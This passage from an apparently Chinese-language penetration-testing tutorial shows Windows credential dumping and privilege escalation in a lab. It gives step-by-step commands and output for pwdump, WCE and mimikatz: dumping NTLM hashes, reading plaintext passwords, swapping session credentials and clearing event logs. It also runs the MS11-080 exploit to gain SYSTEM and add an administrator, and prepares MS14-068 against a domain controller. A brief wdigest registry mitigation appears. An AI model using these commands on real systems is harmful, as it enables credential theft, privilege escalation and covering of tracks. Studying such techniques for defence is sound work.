<ul>
<li>windows 登录密码保存在 C:\Windows\System32\config\SAM 文件中</li>
<li>pwdump 在 kali 系统中可以找到 /usr/share/windows-binaries/fgdump/</li>
<li>添加用户</li>
</ul>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="attribute">C</span>:\Documents and Settings\kevin&gt;net user user2 <span class="number">123456</span> /add</span><br><span class="line"><span class="attribute">C</span>:\Documents and Settings\kevin&gt;net user</span><br><span class="line">	\\ICST-WINATT 的用户帐户</span><br><span class="line">	-------------------------------------------------------------</span><br><span class="line">	Administrator            Guest                    HelpAssistant</span><br><span class="line">	kevin                    SUPPORT_388945a0         test</span><br><span class="line">	user1                    user2</span><br><span class="line"><span class="attribute">C</span>:\Documents and Settings\kevin&gt;cd \</span><br><span class="line"><span class="attribute">C</span>:\&gt;PwDump.exe localhost</span><br><span class="line">	<span class="attribute">Administrator</span>:<span class="number">500</span>:<span class="number">18</span><span class="attribute">D583B495C4696AFF17365FAF1FFE89</span>:<span class="number">5</span><span class="attribute">D36F0CA14EEBEF32F55C7B6A4675DB0</span>:::</span><br><span class="line">	<span class="attribute">Guest</span>:<span class="number">501</span>:NO PASSWORD*********************:NO PASSWORD*********************:::</span><br><span class="line">	<span class="attribute">HelpAssistant</span>:<span class="number">1000</span>:<span class="number">5906</span><span class="attribute">F3A72959D5902440275BA555A537</span>:<span class="number">10</span><span class="attribute">AA20D63C3EC71E0102AC95ADF6DF73</span>:::</span><br><span class="line">	<span class="attribute">kevin</span>:<span class="number">1004</span>:<span class="number">44</span><span class="attribute">EFCE164AB921CAAAD3B435B51404EE</span>:<span class="number">32</span><span class="attribute">ED87BDB5FDC5E9CBA88547376818D4</span>:::</span><br><span class="line">	<span class="attribute">SUPPORT_388945a0</span>:<span class="number">1002</span>:NO PASSWORD*********************:<span class="number">8</span><span class="attribute">AFA81401E8D8EBFA42B4E46F6507C07</span>:::</span><br><span class="line">	<span class="attribute">test</span>:<span class="number">1005</span>:<span class="number">44</span><span class="attribute">EFCE164AB921CAAAD3B435B51404EE</span>:<span class="number">32</span><span class="attribute">ED87BDB5FDC5E9CBA88547376818D4</span>:::</span><br><span class="line">	<span class="attribute">user1</span>:<span class="number">1006</span>:<span class="number">44</span><span class="attribute">EFCE164AB921CAAAD3B435B51404EE</span>:<span class="number">32</span><span class="attribute">ED87BDB5FDC5E9CBA88547376818D4</span>:::</span><br><span class="line">	<span class="attribute">user2</span>:<span class="number">1007</span>:<span class="number">44</span><span class="attribute">EFCE164AB921CAAAD3B435B51404EE</span>:<span class="number">32</span><span class="attribute">ED87BDB5FDC5E9CBA88547376818D4</span>:::Completed.</span><br><span class="line"># 结果：前部分是 LMHASH ，后部分是 NTLMHASH</span><br></pre></td></tr></table></figure>

<ul>
<li><p>可以将结果保存在文件中，然后在 kali 中进行破解</p>
<p><img src="https://img-blog.csdnimg.cn/20190413165117218.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</li>
</ul>
</li>
</ul>
<h4 id="WCE-WINDOWS-CREDENTIAL-EDITOR"><a href="#WCE-WINDOWS-CREDENTIAL-EDITOR" class="headerlink" title="WCE (WINDOWS CREDENTIAL EDITOR)"></a>WCE (WINDOWS CREDENTIAL EDITOR)</h4><ul>
<li>WINDOWS身份认证过程</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20190413165135348.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h5 id="WCE-WINDOWS-CREDENTIAL-EDITOR-1"><a href="#WCE-WINDOWS-CREDENTIAL-EDITOR-1" class="headerlink" title="WCE (WINDOWS CREDENTIAL EDITOR)"></a>WCE (WINDOWS CREDENTIAL EDITOR)</h5><ul>
<li>windows 内核中保存有密码明文副本，安全机制较低</li>
<li>需要管理员权限</li>
<li>工具保持在 kali 的 /usr/share/wce/wce-universal # 通用格式是自动识别32位和64位</li>
<li>多用户登录目标主机</li>
</ul>
<p><img src="/2020/04/03/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-yi/D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%B8%80%5Cwatermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ul>
<li>列举登录账号及会话</li>
</ul>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">C:\&gt;wce-universal.exe -lv</span><br><span class="line">	<span class="number">0020</span>B19D:user1:ICST-WINATT:<span class="number">44</span>EFCE164AB921CAAAD3B435B51404EE:<span class="number">32</span>ED87BDB5FDC5E9CBA88547376818D4</span><br><span class="line">	<span class="number">001E5</span>D92:user2:ICST-WINATT:<span class="number">44</span>EFCE164AB921CAAAD3B435B51404EE:<span class="number">32</span>ED87BDB5FDC5E9CBA88547376818D4</span><br><span class="line">	<span class="number">001</span>B9220:test:ICST-WINATT:<span class="number">44</span>EFCE164AB921CAAAD3B435B51404EE:<span class="number">32</span>ED87BDB5FDC5E9CBA88547376818D4</span><br><span class="line">	<span class="number">0000</span>C7CE:kevin:ICST-WINATT:<span class="number">44</span>EFCE164AB921CAAAD3B435B51404EE:<span class="number">32</span>ED87BDB5FDC5E9CBA88547376818D4</span><br><span class="line">	<span class="number">000003E4</span>:ICST-WINATT$:MSHOME:AAD3B435B51404EEAAD3B435B51404EE:<span class="number">31</span>D6CFE0D16AE931B73C59D7E0C089C0</span><br><span class="line">	# 与 C:\&gt;PwDump.exe localhost 结果相同</span><br></pre></td></tr></table></figure>

<ul>
<li><p>每隔5秒刷新一次</p>
<ul>
<li>wce-universal.exe -r</li>
</ul>
</li>
<li><p>删除登录会话</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="string">C:</span>\&gt;wce-universal.exe -d <span class="number">0020</span>B19D</span><br><span class="line"><span class="string">C:</span>\&gt;wce-universal.exe -lv</span><br><span class="line"><span class="symbol">	001E5D92:</span><span class="string">user2:</span>ICST-<span class="string">WINATT:</span><span class="number">44</span><span class="string">EFCE164AB921CAAAD3B435B51404EE:</span><span class="number">32</span>ED87BDB5FDC5E9CBA88547376818D4</span><br><span class="line"><span class="symbol">	001B9220:</span><span class="string">test:</span>ICST-<span class="string">WINATT:</span><span class="number">44</span><span class="string">EFCE164AB921CAAAD3B435B51404EE:</span><span class="number">32</span>ED87BDB5FDC5E9CBA88547376818D4</span><br><span class="line"><span class="symbol">	0000C7CE:</span><span class="string">kevin:</span>ICST-<span class="string">WINATT:</span><span class="number">44</span><span class="string">EFCE164AB921CAAAD3B435B51404EE:</span><span class="number">32</span>ED87BDB5FDC5E9CBA88547376818D4</span><br><span class="line"><span class="symbol">	000003E4:</span>ICST-<span class="string">WINATT$:</span><span class="string">MSHOME:</span><span class="string">AAD3B435B51404EEAAD3B435B51404EE:</span><span class="number">31</span>D6CFE0D16AE931B73C59D7E0C089C0</span><br></pre></td></tr></table></figure>
</li>
<li><p>计算密码对应的 HASH 值</p>
</li>
</ul>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="attribute">C</span>:\&gt;wce-universal.exe -g passwd</span><br><span class="line">	<span class="attribute">Password</span>:   passwd</span><br><span class="line">	<span class="attribute">Hashes</span>:     <span class="number">91</span><span class="attribute">C7AE7122196B5EAAD3B435B51404EE</span>:<span class="number">22315</span>D6ED1A7D5F8A7C98C40E9FA2DEC</span><br></pre></td></tr></table></figure>

<ul>
<li>读取内核中的明文密码</li>
</ul>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">C:\&gt;wce-universal.exe -w</span><br><span class="line">	user1\ICST-WINATT:123456</span><br><span class="line">	user2\ICST-WINATT:123456</span><br><span class="line">	test\ICST-WINATT:123456</span><br><span class="line">	kevin\ICST-WINATT:123456</span><br><span class="line"><span class="built_in">	NETWORK </span>SERVICE\MSHOME:</span><br><span class="line"></span><br><span class="line">C:\&gt;net<span class="built_in"> user </span>user1 111222</span><br><span class="line">	命令成功完成。</span><br><span class="line">C:\&gt;wce-universal.exe -w</span><br><span class="line">	user1\ICST-WINATT:123456</span><br><span class="line">	user2\ICST-WINATT:123456</span><br><span class="line">	test\ICST-WINATT:123456</span><br><span class="line">	kevin\ICST-WINATT:123456</span><br><span class="line"><span class="built_in">	NETWORK </span>SERVICE\MSHOME:</span><br><span class="line"><span class="comment"># 当前内核中保存的值会在下次登录被读取出来</span></span><br></pre></td></tr></table></figure>

<ul>
<li>对 LUID 进行修改（将LUID改为匹配其他用户的用户名和密码）</li>
</ul>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="string">C:</span>\&gt;wce-universal.exe -lv</span><br><span class="line"><span class="symbol">	001E5D92:</span><span class="string">user2:</span>ICST-<span class="string">WINATT:</span><span class="number">44</span><span class="string">EFCE164AB921CAAAD3B435B51404EE:</span><span class="number">32</span>ED87BDB5FDC5E9CBA88547376818D4</span><br><span class="line"><span class="symbol">	001B9220:</span><span class="string">test:</span>ICST-<span class="string">WINATT:</span><span class="number">44</span><span class="string">EFCE164AB921CAAAD3B435B51404EE:</span><span class="number">32</span>ED87BDB5FDC5E9CBA88547376818D4</span><br><span class="line"><span class="symbol">	0000C7CE:</span><span class="string">kevin:</span>ICST-<span class="string">WINATT:</span><span class="number">44</span><span class="string">EFCE164AB921CAAAD3B435B51404EE:</span><span class="number">32</span>ED87BDB5FDC5E9CBA88547376818D4</span><br><span class="line"><span class="symbol">	000003E4:</span>ICST-<span class="string">WINATT$:</span><span class="string">MSHOME:</span><span class="string">AAD3B435B51404EEAAD3B435B51404EE:</span><span class="number">31</span>D6CFE0D16AE931B73C59D7E0C089C0</span><br><span class="line"><span class="string">C:</span>\&gt;wce-universal.exe -i <span class="number">001E5</span>D92 -s <span class="string">kevin:</span>ICST-	<span class="string">WINATT:</span><span class="number">44</span><span class="string">EFCE164AB921CAAAD3B435B51404EE:</span><span class="number">32</span>ED87BDB5FDC5E9CBA88547376818D4</span><br><span class="line">	Changing NTLM credentials of logon session <span class="number">001E5</span>D92h <span class="string">to:</span></span><br><span class="line"><span class="symbol">	Username:</span> kevin</span><br><span class="line"><span class="symbol">	domain:</span> ICST-WINATT</span><br><span class="line"><span class="symbol">	LMHash:</span> <span class="number">44</span>EFCE164AB921CAAAD3B435B51404EE</span><br><span class="line"><span class="symbol">	NTHash:</span> <span class="number">32</span>ED87BDB5FDC5E9CBA88547376818D4</span><br><span class="line">	NTLM credentials successfully changed!</span><br><span class="line"><span class="string">C:</span>\&gt;wce-universal.exe -lv</span><br><span class="line"><span class="symbol">	001E5D92:</span><span class="string">kevin:</span>ICST-<span class="string">WINATT:</span><span class="number">44</span><span class="string">EFCE164AB921CAAAD3B435B51404EE:</span><span class="number">32</span>ED87BDB5FDC5E9CBA88547376818D4</span><br><span class="line"><span class="symbol">	001B9220:</span><span class="string">test:</span>ICST-<span class="string">WINATT:</span><span class="number">44</span><span class="string">EFCE164AB921CAAAD3B435B51404EE:</span><span class="number">32</span>ED87BDB5FDC5E9CBA88547376818D4</span><br><span class="line"><span class="symbol">	000003E4:</span>ICST-<span class="string">WINATT$:</span><span class="string">MSHOME:</span><span class="string">AAD3B435B51404EEAAD3B435B51404EE:</span><span class="number">31</span>D6CFE0D16AE931B73C59D7E0C089C0</span><br></pre></td></tr></table></figure>

<ul>
<li><p>Win7 及 之前默认 都可遭受 WCE 攻击</p>
<ul>
<li>防范方法：修改注册表</li>
</ul>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE<span class="symbol">\S</span>YSTEM<span class="symbol">\C</span>urrentControlSet<span class="symbol">\C</span>ontrol<span class="symbol">\L</span>sa<span class="symbol">\S</span>ecurity Packages</span><br></pre></td></tr></table></figure>

<ul>
<li>删除 wdigest 之后重启计算机</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20190413165146599.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</li>
</ul>
<h5 id="fgdump"><a href="#fgdump" class="headerlink" title="fgdump"></a>fgdump</h5><ul>
<li>PwDump localhost<ul>
<li>位置：Pwdump 在 kali 系统中可以找到 /usr/share/windows-binaries/fgdump/</li>
</ul>
</li>
<li>fgdump<ul>
<li>位置：Pwdump 在 kali 系统中可以找到 /usr/share/windows-binaries/fgdump/<br>放在 WinXP 中， 双击或在命令行执行 fgdump.exe 会自动生成三个文件，文件中保存着密码</li>
</ul>
</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20190413165151759.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h5 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h5><ul>
<li>在 kali 中的路径 /usr/share/mimikatz，将 win32 复制到 windows 主机</li>
</ul>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">C:\Win32&gt;mimikatz.exe</span><br><span class="line">查看帮助是：：</span><br><span class="line">mimikatz # ::</span><br><span class="line">	        standard  -  Standard module  [Basic commands (does <span class="keyword">not</span> require module name)]</span><br><span class="line">	          crypto  -  Crypto Module</span><br><span class="line">	        sekurlsa  -  SekurLSA module  [Some commands <span class="keyword">to</span> enumerate credentials<span class="built_in">..</span>.]</span><br><span class="line">	        kerberos  -  Kerberos package module  []</span><br><span class="line">	       privilege  -  Privilege module</span><br><span class="line">	         process  -  Process module</span><br><span class="line">	        <span class="built_in"> service </span> - <span class="built_in"> Service </span>module</span><br><span class="line">	         lsadump  -  LsaDump module</span><br><span class="line">	              ts  -  Terminal<span class="built_in"> Server </span>module</span><br><span class="line">	           event  -  Event module</span><br><span class="line">	            misc  -  Miscellaneous module</span><br><span class="line">	           token  -  Token manipulation module</span><br><span class="line">	           vault  -  Windows Vault/Credential module</span><br><span class="line">	     minesweeper  -  MineSweeper module</span><br><span class="line">	             net  -</span><br><span class="line">	           dpapi  -  DPAPI Module (by API <span class="keyword">or</span><span class="built_in"> RAW </span>access)  [Data Protection application programming interface]</span><br><span class="line">	       busylight  -  BusyLight Module</span><br><span class="line">	          sysenv  - <span class="built_in"> System </span>Environment Value module</span><br><span class="line">	             sid  -  Security Identifiers module</span><br><span class="line">	             iis  -  IIS XML<span class="built_in"> Config </span>module</span><br><span class="line">	             rpc  -  RPC control of mimikatz			</span><br><span class="line">mimikatz # privilege::</span><br><span class="line">			Module :        privilege</span><br><span class="line">			Full name :     Privilege module</span><br><span class="line">	</span><br><span class="line">	           <span class="builtin-name">debug</span>  -  Ask <span class="builtin-name">debug</span> privilege            * *</span><br><span class="line">	          driver  -  Ask load driver privilege</span><br><span class="line">	        security  -  Ask security privilege</span><br><span class="line">	             tcb  -  Ask tcb privilege</span><br><span class="line">	          backup  -  Ask backup privilege</span><br><span class="line">	         restore  -  Ask restore privilege</span><br><span class="line">	          sysenv  -  Ask<span class="built_in"> system </span>environment privilege</span><br><span class="line">	              id  -  Ask a privilege by its id</span><br><span class="line">	            name  -  Ask a privilege by its name</span><br><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # sekurlsa::</span><br><span class="line">mimikatz # sekurlsa::logonPasswords</span><br><span class="line">mimikatz # sekurlsa::wdigest</span><br><span class="line">mimikatz # process::list</span><br><span class="line">mimikatz # lsadump::sam</span><br><span class="line">mimikatz # lsadump::cache</span><br><span class="line">mimikatz # ts::multirdp</span><br><span class="line">mimikatz # event::clear</span><br><span class="line">mimikatz # event::drop</span><br><span class="line">mimikatz # misc::regedit</span><br><span class="line">mimikatz # token::whoami</span><br></pre></td></tr></table></figure>



<h4 id="利用漏洞提权"><a href="#利用漏洞提权" class="headerlink" title="利用漏洞提权"></a>利用漏洞提权</h4><h5 id="1-使用-Ms011-080-获取-WinXP-的-SYSTEM-权限"><a href="#1-使用-Ms011-080-获取-WinXP-的-SYSTEM-权限" class="headerlink" title="1. 使用 Ms011-080 获取 WinXP 的 SYSTEM 权限"></a>1. 使用 Ms011-080 获取 WinXP 的 SYSTEM 权限</h5><ul>
<li><p>Ms011-080 对应补丁 Kb2592799</p>
<p><a href="https://technet.microsoft.com/library/security/ms11-080" target="_blank" rel="noopener">微软官网公告(https://technet.microsoft.com/library/security/ms11-080)</a></p>
<p><img src="https://img-blog.csdnimg.cn/20190413165237322.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</li>
</ul>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># searchsploit Ms11-080</span></span><br><span class="line">	------------------------------------------ --------------------------------</span><br><span class="line">	 Exploit Title                            |  Path</span><br><span class="line">	                                          | (<span class="regexp">/usr/share</span><span class="regexp">/exploitdb/</span>)</span><br><span class="line">	------------------------------------------ --------------------------------</span><br><span class="line">	Microsoft Windows - <span class="string">'AfdJoinLeaf'</span> Local P | exploits/windows/local/<span class="number">21844</span>.rb</span><br><span class="line">	Microsoft Windows XP/<span class="number">2003</span> - <span class="string">'afd.sys'</span> Loc | exploits/windows/local/<span class="number">18176</span>.py</span><br><span class="line">	------------------------------------------ --------------------------------</span><br><span class="line"></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># cp /usr/share/exploitdb/exploits/windows/local/18176.py .</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将文件拷贝到 英文版 WinXP 系统(有时候中文版 XP 也可以使用)</span></span><br><span class="line"><span class="comment"># 首先查看 WinXP 是否安装了 对应更新 Kb2592799</span></span><br><span class="line">WinXP -&gt; 运行 -&gt; appwiz.cpl -&gt; 查看是否有安装 Kb2592799，有的话卸载掉</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20190413165247833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p> 查看 WinXP下的文件路径</p>
<p><img src="https://img-blog.csdnimg.cn/20190413165254957.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>1.WinXP 上安装的 python 的运行环境<br>C:\Documents and Settings\kevin&gt;cd \</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">C:\&gt;<span class="number">18176.</span>py -O XP</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20190413165302568.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>  启动任务管理器</p>
<p><img src="https://img-blog.csdnimg.cn/20190413165311388.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>  结束 kevin 权限的 explorer 桌面程序</p>
<p><img src="https://img-blog.csdnimg.cn/20190413165317715.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>  输入 explorer</p>
<p><img src="https://img-blog.csdnimg.cn/2019041316532377.png" alt="在这里插入图片描述"></p>
<p>  启动 system 权限的 explorer 桌面程序</p>
<p><img src="https://img-blog.csdnimg.cn/20190413165333649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>2.WinXP 无需安装 Pyhon 的运行环境</p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用 python2 的 pyinstaller 将 python 文件进行打包</span></span><br><span class="line">root@kali:~<span class="comment"># apt-get install python-pip</span></span><br><span class="line">root@kali:~<span class="comment"># pip install pyinstaller</span></span><br><span class="line"><span class="comment"># 或者 WinXP 下，安装 python2.7</span></span><br><span class="line">C:<span class="string">\&gt;pyinstaller</span> --onefile <span class="number">18176.py</span></span><br><span class="line">	<span class="number">297</span> INFO: Building EXE <span class="keyword">from</span> out00-EXE.toc</span><br><span class="line">	<span class="number">297</span> INFO: Appending archive <span class="keyword">to</span> EXE C:<span class="string">\dist\18176.exe</span></span><br><span class="line">	<span class="number">328</span> INFO: Building EXE <span class="keyword">from</span> out00-EXE.toc completed successfully.</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/2019041316534468.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打开文件目录，将文件复制到目标主机</span></span><br><span class="line">C:\&gt;whoami</span><br><span class="line">	test</span><br><span class="line">C:\&gt;net<span class="built_in"> user </span>test</span><br><span class="line">	本地组成员             *Users</span><br><span class="line">	全局组成员             *None</span><br><span class="line"><span class="comment"># 查看文件位置</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20190413165353673.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">C:\&gt;cd <span class="number">111</span></span><br><span class="line">C:\<span class="number">111</span>&gt;<span class="number">18176.</span>exe -O XP</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20190413165402710.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">C:\WINDOWS\system32&gt;whoami</span><br><span class="line">	SYSTEM</span><br><span class="line"><span class="comment"># 将自己添加为管理员组</span></span><br><span class="line">C:\WINDOWS\system32&gt;net localgroup administrators test /add</span><br><span class="line">	命令成功完成。</span><br></pre></td></tr></table></figure>

<p>2.用 Ms11-046 时目标主机蓝屏(Dos)</p>
<h5 id="2-Win7-使用-Ms14-068-获取-域控制器的权限"><a href="#2-Win7-使用-Ms14-068-获取-域控制器的权限" class="headerlink" title="2.Win7 使用 Ms14-068 获取 域控制器的权限"></a>2.Win7 使用 Ms14-068 获取 域控制器的权限</h5><ul>
<li><p>使用 win2003 搭建域控制器</p>
<ul>
<li><p>配置并连接域控制器</p>
<ul>
<li>运行 -&gt; dcpromo</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20190413165412201.png" alt="在这里插入图片描述"></p>
</li>
</ul>
</li>
</ul>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Win2003 设置成域控制器，配置静态 IP 地址</span></span><br><span class="line"><span class="comment"># Win2003 设置强密码</span></span><br><span class="line">C:\&gt;net<span class="built_in"> user </span>Administrator jlcssadmin2006<span class="built_in">..</span>.</span><br><span class="line"></span><br><span class="line"><span class="comment"># Win7 设置 静态 IP	并将 DNS 设置为 Win2003 的IP地址</span></span><br><span class="line"><span class="comment"># Win7 加入域控制器</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20190413165420295.png" alt="在这里插入图片描述"></p>
<p>​    <img src="https://img-blog.csdnimg.cn/20190413165426948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20190413165431859.png" alt="在这里插入图片描述"></p>
<p>重启之后</p>
<p><img src="https://img-blog.csdnimg.cn/20190413165438137.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ul>
<li><p>修改 Win2003 中的域控制器的用户权限</p>
<ul>
<li>Win2003 -&gt; 运行 -&gt; dsa.msc</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20190413165456477.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20190413165500666.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ul>
<li>Win7</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20190413165516801.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ul>
<li>win2003</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20190413165521164.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ul>
<li>Win7 可以查看域控制器共享出来的文件等资源</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20190413165527351.png" alt="在这里插入图片描述"></p>
<ul>
<li><p>使用漏洞代码攻击域控制器</p>
<ul>
<li><p>获取攻击文件</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="comment"># root@kali:~# searchsploit Ms14-068</span></span><br><span class="line">	<span class="params">------------------------------------------</span> <span class="params">----------------------------------</span></span><br><span class="line">	 Exploit Title                            |  Path</span><br><span class="line">                              | <span class="params">(/usr/share/					exploitdb/)</span></span><br><span class="line">	<span class="params">------------------------------------------</span> <span class="params">----------------------------------</span></span><br><span class="line">	Microsoft Windows Kerberos - Privilege Es | exploits/windows/remote/35474.py</span><br><span class="line">	<span class="params">------------------------------------------</span> <span class="params">---------------------------------</span></span><br><span class="line">root@kali:~<span class="comment"># cp /usr/share/exploitdb/exploits/windows/remote/35474.py .</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>域环境下使用通用工具查看本地密码</p>
</li>
</ul>
<figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line">C:<span class="string">\fgdump&gt;PwDump.exe</span> localhost	<span class="comment"># 仅是本地密码</span></span><br><span class="line">C:<span class="string">\&gt;wce-universal.exe</span>	<span class="comment"># 结果是域控制器密码</span></span><br><span class="line">C:<span class="string">\&gt;wce-universal.exe</span> -w</span><br><span class="line">	Administrator<span class="string">\LAB:jlcssadmin</span></span><br><span class="line">C:<span class="string">\Win32&gt;mimikatz.exe</span></span><br><span class="line">mimikatz <span class="comment"># ::</span></span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line">	Privilege <span class="string">'20'</span> OK</span><br><span class="line">mimikatz <span class="comment"># kerberos::list</span></span><br><span class="line">mimikatz <span class="comment"># sekurlsa::logonPasswords</span></span><br></pre></td></tr></table></figure>

<ul>
<li>漏洞利用过程</li>
</ul>
